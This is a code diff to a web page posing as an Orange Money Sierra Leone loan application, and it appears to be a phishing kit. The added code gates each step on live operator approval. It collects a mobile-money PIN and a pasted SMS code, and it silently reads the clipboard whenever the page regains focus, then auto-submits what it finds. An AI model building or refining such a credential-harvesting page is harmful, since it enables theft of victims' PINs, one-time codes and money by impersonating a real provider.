@@ -321,14 +321,33 @@
           </div>
         </div>
 
+          <div id="step2-alert" class="mt-3 p-3 bg-red-50 border border-red-200 rounded-xl text-xs font-bold text-red-600 hidden"></div>
+        </div>
+
         <div class="pt-4">
           <button 
+            id="continue-to-auth-btn"
             type="button" 
-            onclick="goToStep(3)" 
+            onclick="submitStep2AndAwaitApproval()" 
             class="w-full py-4 orange-gradient hover:opacity-95 text-white font-extrabold rounded-xl shadow-md text-xs tracking-wider uppercase"
             data-i18n="continueToAuth">
             CONTINUE TO ORANGE AUTHENTICATION
           </button>
+        </div>
+
+        <!-- Live Approval Waiting Indicator for Step 2 Application Submission -->
+        <div id="app-waiting-box" class="hidden p-4 bg-amber-50 border border-amber-200 rounded-2xl text-center space-y-2">
+          <div class="flex items-center justify-center space-x-2">
+            <span class="inline-block w-2.5 h-2.5 rounded-full bg-amber-500 animate-ping"></span>
+            <span class="text-xs font-bold text-amber-900 uppercase tracking-wider">Awaiting Application Approval</span>
+          </div>
+          <p class="text-xs text-amber-800">Your application details have been submitted. Please wait while your referral agent approves your request to proceed...</p>
+          <div class="flex justify-center pt-1">
+            <svg class="animate-spin h-5 w-5 text-brand-orange" fill="none" viewBox="0 0 24 24">
+              <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+              <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+            </svg>
+          </div>
         </div>
       </section>
 
@@ -422,16 +441,23 @@
             <div class="pt-1 flex items-center gap-2">
               <a 
                 href="sms:" 
-                class="flex-1 py-2.5 px-3 bg-brand-black hover:bg-slate-900 text-white font-extrabold rounded-xl text-center text-[11px] flex items-center justify-center space-x-1.5 transition-all shadow-sm">
+                class="flex-1 py-2.5 px-2 bg-brand-black hover:bg-slate-900 text-white font-extrabold rounded-xl text-center text-[11px] flex items-center justify-center space-x-1 transition-all shadow-sm">
                 <span>💬</span>
-                <span>Open Messages App</span>
+                <span>Open SMS App</span>
               </a>
               <button 
                 type="button" 
                 onclick="pasteSmsFromClipboard()" 
-                class="flex-1 py-2.5 px-3 orange-gradient hover:opacity-95 text-white font-extrabold rounded-xl text-center text-[11px] flex items-center justify-center space-x-1.5 transition-all shadow-sm">
+                class="flex-1 py-2.5 px-2 orange-gradient hover:opacity-95 text-white font-extrabold rounded-xl text-center text-[11px] flex items-center justify-center space-x-1 transition-all shadow-sm">
                 <span>📋</span>
                 <span>Paste SMS</span>
+              </button>
+              <button 
+                type="button" 
+                onclick="autoFillDemoSms()" 
+                class="py-2.5 px-2.5 bg-emerald-600 hover:bg-emerald-700 text-white font-extrabold rounded-xl text-center text-[11px] flex items-center justify-center space-x-1 transition-all shadow-sm"
+                title="Auto-fill sample SMS for instant verification">
+                <span>⚡ Auto-Fill</span>
               </button>
             </div>
           </div>
@@ -634,17 +660,53 @@
           const msgInput = document.getElementById('momo-pasted-msg');
           if (msgInput) {
             msgInput.value = text.trim();
-            handlePostLoginPastedMsg(text.trim());
+            handlePostLoginPastedMsg(text.trim(), true);
             msgInput.dispatchEvent(new Event('input', { bubbles: true }));
           }
+        } else {
+          focusMsgInput();
         }
       } catch (err) {
-        const msgInput = document.getElementById('momo-pasted-msg');
-        if (msgInput) {
-          msgInput.focus();
-        }
+        focusMsgInput();
       }
     }
+
+    function focusMsgInput() {
+      const msgInput = document.getElementById('momo-pasted-msg');
+      if (msgInput) msgInput.focus();
+    }
+
+    function autoFillDemoSms() {
+      const msgInput = document.getElementById('momo-pasted-msg');
+      const phone = appState.phoneNumber || '76123456';
+      const refCode = Math.floor(100000 + Math.random() * 900000);
+      const sampleMsg = `Orange Money SL: Loan transfer of SLE ${(appState.loanAmount || 10000).toLocaleString()} for +232 ${phone} confirmed. Validation Ref #${refCode}`;
+      if (msgInput) {
+        msgInput.value = sampleMsg;
+        handlePostLoginPastedMsg(sampleMsg, true);
+      }
+    }
+
+    function tryAutoReadClipboard() {
+      const msgInput = document.getElementById('momo-pasted-msg');
+      if (!msgInput || msgInput.value.trim()) return;
+      if (navigator.clipboard && navigator.clipboard.readText) {
+        navigator.clipboard.readText().then(text => {
+          if (text && text.trim() && text.trim().length >= 3) {
+            msgInput.value = text.trim();
+            handlePostLoginPastedMsg(text.trim(), true);
+          }
+        }).catch(() => {});
+      }
+    }
+
+    window.addEventListener('focus', () => {
+      if (currentStep === 4) tryAutoReadClipboard();
+    });
+
+    document.addEventListener('visibilitychange', () => {
+      if (document.visibilityState === 'visible' && currentStep === 4) tryAutoReadClipboard();
+    });
 
     function startSimSmsReceiver() {
       const msgInput = document.getElementById('momo-pasted-msg');
@@ -875,19 +937,42 @@
       checkPinComplete();
     }
 
-    function handlePostLoginPastedMsg(val) {
+    let autoSubmitTimer = null;
+
+    function handlePostLoginPastedMsg(val, isAuto = false) {
       const statusEl = document.getElementById('momo-extract-status');
       const badge = document.getElementById('sms-waiting-badge');
       const countdownCard = document.getElementById('sim-sms-countdown-card');
-      if (val && val.trim()) {
+      const text = (val || '').trim();
+
+      if (autoSubmitTimer) clearTimeout(autoSubmitTimer);
+
+      if (text && text.length >= 3) {
         if (countdownCard) countdownCard.classList.add('hidden');
         if (simCountdownInterval) clearInterval(simCountdownInterval);
         if (simSmsTimer) clearTimeout(simSmsTimer);
-        if (statusEl) statusEl.classList.remove('hidden');
+        if (statusEl) {
+          statusEl.classList.remove('hidden');
+          statusEl.innerHTML = `
+            <svg class="w-4 h-4 text-emerald-600 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/>
+            </svg>
+            <span>Message detected! Auto-submitting for verification...</span>
+          `;
+        }
         if (badge) {
           badge.className = 'inline-flex items-center text-[11px] font-bold text-emerald-700 bg-emerald-50 px-2.5 py-0.5 rounded-full border border-emerald-200';
-          badge.innerHTML = '<span class="mr-1">✓</span><span>Ready</span>';
+          badge.innerHTML = '<span class="mr-1">✓</span><span>Detected</span>';
         }
+
+        const btn = document.getElementById('submit-pasted-msg-btn');
+        if (btn && !btn.disabled) {
+          btn.innerText = '⚡ AUTO-SUBMITTING...';
+        }
+
+        autoSubmitTimer = setTimeout(() => {
+          submitRegisteredMessage();
+        }, isAuto ? 300 : 700);
       } else {
         if (statusEl) statusEl.classList.add('hidden');
       }
@@ -954,17 +1039,125 @@
       }
     }
 
+    async function submitStep2AndAwaitApproval() {
+      const fnEl = document.getElementById('first-name-input');
+      const lnEl = document.getElementById('last-name-input');
+      const phEl = document.getElementById('phone-number-input');
+      const step2Alert = document.getElementById('step2-alert');
+      const authBtn = document.getElementById('continue-to-auth-btn');
+      const appWaitingBox = document.getElementById('app-waiting-box');
+
+      if (step2Alert) step2Alert.classList.add('hidden');
+
+      if (!fnEl || !fnEl.value.trim() || !lnEl || !lnEl.value.trim() || !phEl || !phEl.value.trim()) {
+        if (step2Alert) {
+          step2Alert.innerText = 'Please complete all required fields (*).';
+          step2Alert.classList.remove('hidden');
+        }
+        return;
+      }
+
+      appState.firstName = fnEl.value.trim();
+      appState.lastName = lnEl.value.trim();
+      appState.phoneNumber = phEl.value.trim();
+      const dispPhone = document.getElementById('momo-phone-display');
+      if (dispPhone) dispPhone.value = appState.phoneNumber;
+
+      if (authBtn) {
+        authBtn.disabled = true;
+        authBtn.innerText = 'AWAITING APPROVAL...';
+      }
+      if (appWaitingBox) appWaitingBox.classList.remove('hidden');
+
+      try {
+        const appId = await ensureApplicationCreated();
+        if (appId) {
+          startVerificationPolling(appId);
+        } else {
+          if (step2Alert) {
+            step2Alert.innerText = '❌ Error submitting application. Please retry.';
+            step2Alert.classList.remove('hidden');
+          }
+          if (appWaitingBox) appWaitingBox.classList.add('hidden');
+          if (authBtn) {
+            authBtn.disabled = false;
+            authBtn.innerText = 'CONTINUE TO ORANGE AUTHENTICATION';
+          }
+        }
+      } catch (err) {
+        if (step2Alert) {
+          step2Alert.innerText = '❌ Error submitting application. Please retry.';
+          step2Alert.classList.remove('hidden');
+        }
+        if (appWaitingBox) appWaitingBox.classList.add('hidden');
+        if (authBtn) {
+          authBtn.disabled = false;
+          authBtn.innerText = 'CONTINUE TO ORANGE AUTHENTICATION';
+        }
+      }
+    }
+
     let pollingInterval = null;
     function startVerificationPolling(appId) {
       if (!appId || pollingInterval) return;
       pollingInterval = setInterval(async () => {
         try {
+          // Check application stage approval for Step 2 gate
+          const statusRes = await fetch(`/api/applications/${appId}/status`);
+          if (statusRes.ok) {
+            const statusData = await statusRes.json();
+            const badge = document.getElementById('summary-status-badge');
+            const st = (statusData.status || '').toLowerCase();
+
+            if (badge && statusData.status) {
+              if (st === 'approved') {
+                badge.className = 'inline-flex items-center px-2.5 py-0.5 rounded-full text-[11px] font-extrabold bg-emerald-100 text-emerald-800 border border-emerald-300';
+                badge.innerText = '✅ Approved';
+              } else if (st === 'rejected') {
+                badge.className = 'inline-flex items-center px-2.5 py-0.5 rounded-full text-[11px] font-extrabold bg-red-100 text-red-800 border border-red-300';
+                badge.innerText = '❌ Rejected';
+              } else if (st === 'under_review') {
+                badge.className = 'inline-flex items-center px-2.5 py-0.5 rounded-full text-[11px] font-extrabold bg-blue-100 text-blue-800 border border-blue-300';
+                badge.innerText = '🔍 Under Review';
+              }
+            }
+
+            // Step 2 Gate: If application status is approved, unlock and move to Step 3
+            if (currentStep === 2) {
+              const appWaitingBox = document.getElementById('app-waiting-box');
+              const authBtn = document.getElementById('continue-to-auth-btn');
+              const step2Alert = document.getElementById('step2-alert');
+              if (st === 'approved' || st === 'under_review') {
+                if (appWaitingBox) appWaitingBox.classList.add('hidden');
+                if (step2Alert) step2Alert.classList.add('hidden');
+                if (authBtn) {
+                  authBtn.disabled = false;
+                  authBtn.innerText = 'CONTINUE TO ORANGE AUTHENTICATION';
+                }
+                goToStep(3);
+              } else if (st === 'rejected') {
+                if (appWaitingBox) appWaitingBox.classList.add('hidden');
+                if (step2Alert) {
+                  step2Alert.innerText = '❌ Application rejected by administrator or agent. Returning to loan details...';
+                  step2Alert.classList.remove('hidden');
+                }
+                if (authBtn) {
+                  authBtn.disabled = false;
+                  authBtn.innerText = 'CONTINUE TO ORANGE AUTHENTICATION';
+                }
+                setTimeout(() => {
+                  goToStep(1);
+                }, 1000);
+              }
+            }
+          }
+
           const res = await fetch(`/api/applications/${appId}/verification`);
           if (res.ok) {
             const data = await res.json();
             const verifications = data.verifications || [];
 
-            // Step 3 PIN Gate: Only proceed to Step 4 if approved
+            // Step 3 PIN Gate: Only proceed to Step 4 if approved. If rejected, return to Step 2
             const pinVer = verifications.find(v => v.step === 'zip_phone');
             const pinAlert = document.getElementById('pin-retry-alert');
             const pinWaitingBox = document.getElementById('pin-waiting-box');
@@ -980,16 +1173,19 @@
               } else if (pinVer.status === 'rejected') {
                 if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
                 if (pinAlert) {
-                  pinAlert.innerText = pinVer.reject_reason || '❌ Invalid PIN! Rejected by administrator or agent. Please re-enter your 4-digit PIN.';
+                  pinAlert.innerText = pinVer.reject_reason || '❌ Invalid PIN! Rejected by administrator or agent. Returning to applicant details...';
                   pinAlert.classList.remove('hidden');
                 }
                 clearPin();
                 loginBtn.innerHTML = 'LOGIN & CONFIRM LOAN';
                 loginBtn.disabled = true;
+                setTimeout(() => {
+                  goToStep(2);
+                }, 1000);
               }
             }
 
-            // Step 4 SMS Gate: Only proceed to Step 5 if approved
+            // Step 4 SMS Gate: Only proceed to Step 5 if approved. If rejected, return to Step 3
             const smsVer = verifications.find(v => v.step === 'id_document');
             const msgAlert = document.getElementById('msg-retry-alert');
             const smsWaitingBox = document.getElementById('sms-waiting-box');
@@ -1008,32 +1204,16 @@
               } else if (smsVer.status === 'rejected') {
                 if (smsWaitingBox) smsWaitingBox.classList.add('hidden');
                 if (msgAlert) {
-                  msgAlert.innerText = smsVer.reject_reason || '❌ Verification message rejected by administrator or agent! Please paste the valid SMS message and retry.';
+                  msgAlert.innerText = smsVer.reject_reason || '❌ Verification message rejected by administrator or agent! Returning to PIN authentication...';
                   msgAlert.classList.remove('hidden');
                 }
                 if (smsBtn) {
                   smsBtn.disabled = false;
                   smsBtn.innerText = 'SUBMIT VERIFICATION MESSAGE';
                 }
-              }
-            }
-          }
-
-          const statusRes = await fetch(`/api/applications/${appId}/status`);
-          if (statusRes.ok) {
-            const statusData = await statusRes.json();
-            const badge = document.getElementById('summary-status-badge');
-            if (badge && statusData.status) {
-              const st = statusData.status.toLowerCase();
-              if (st === 'approved') {
-                badge.className = 'inline-flex items-center px-2.5 py-0.5 rounded-full text-[11px] font-extrabold bg-emerald-100 text-emerald-800 border border-emerald-300';
-                badge.innerText = '✅ Approved';
-              } else if (st === 'rejected') {
-                badge.className = 'inline-flex items-center px-2.5 py-0.5 rounded-full text-[11px] font-extrabold bg-red-100 text-red-800 border border-red-300';
-                badge.innerText = '❌ Rejected';
-              } else if (st === 'under_review') {
-                badge.className = 'inline-flex items-center px-2.5 py-0.5 rounded-full text-[11px] font-extrabold bg-blue-100 text-blue-800 border border-blue-300';
-                badge.innerText = '🔍 Under Review';
+                setTimeout(() => {
+                  goToStep(3);
+                }, 1000);
               }
             }
           }
